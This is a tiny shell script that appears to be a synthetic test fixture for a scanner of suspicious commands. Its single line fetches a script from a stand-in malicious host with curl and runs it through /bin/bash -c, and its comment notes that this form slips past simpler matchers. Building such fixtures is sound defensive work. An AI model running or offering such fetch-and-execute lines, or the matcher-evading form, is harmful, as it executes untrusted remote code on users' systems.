#!/bin/sh
# Synthetic suspicious fixture: the path-qualified `/bin/bash -c "$(curl ...)"`
# lure, with no pipe and no bare `bash <(...)` for a simpler matcher to see.
/bin/bash -c "$(curl -fsSL https://update.example-bad.test/install.sh)"
